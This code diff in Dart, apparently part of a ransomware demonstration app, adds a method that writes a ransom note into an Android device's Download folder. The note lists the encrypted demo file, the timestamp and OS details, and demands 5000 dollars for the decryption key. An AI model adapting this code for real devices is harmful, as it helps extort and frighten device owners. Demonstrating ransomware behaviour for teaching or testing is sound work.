@@ -89,4 +89,62 @@ class DemoFileService {
   static Future<bool> isEncrypted() async {
     return encryptedFile.exists();
   }
+
+    static const String manifestFilePath =
+      '/storage/emulated/0/Download/ransomware_manifest.txt';
+
+  static File get manifestFile => File(manifestFilePath);
+
+  static Future<void> generateRansomwareManifest() async {
+    final timestamp = DateTime.now().toIso8601String();
+
+    final systemInfo =
+        'OS: ${Platform.operatingSystem}\n'
+        'OS Version: ${Platform.operatingSystemVersion}\n';
+
+    final manifest = '''
+==================================================
+             RANSOMWARE MANIFEST
+==================================================
+
+
+1. ENCRYPTION INFORMATION
+--------------------------------------------------
+Encryption Timestamp:
+$timestamp
+
+Encryption Status:
+giant_step_demo.txt FILE ENCRYPTED
+
+2. FILES AFFECTED
+--------------------------------------------------
+Original Demo File:
+$demoFilePath
+
+Demo Encrypted File:
+$encryptedFilePath
+
+3. RECOVERY / DECRYPTION INFORMATION
+--------------------------------------------------
+
+Once you pay the ransom demand then I will provide you the decryption key and AES decryption code and use it to decrypt your file.
+
+4. RANSOM DEMAND
+--------------------------------------------------
+DEMO RANSOM DEMAND: 5000 dollars
+
+5. SYSTEM INFORMATION
+--------------------------------------------------
+$systemInfo
+
+==================================================
+        END OF DEMONSTRATION MANIFEST
+==================================================
+''';
+
+    await manifestFile.writeAsString(
+      manifest,
+      flush: true,
+    );
+  }
 }
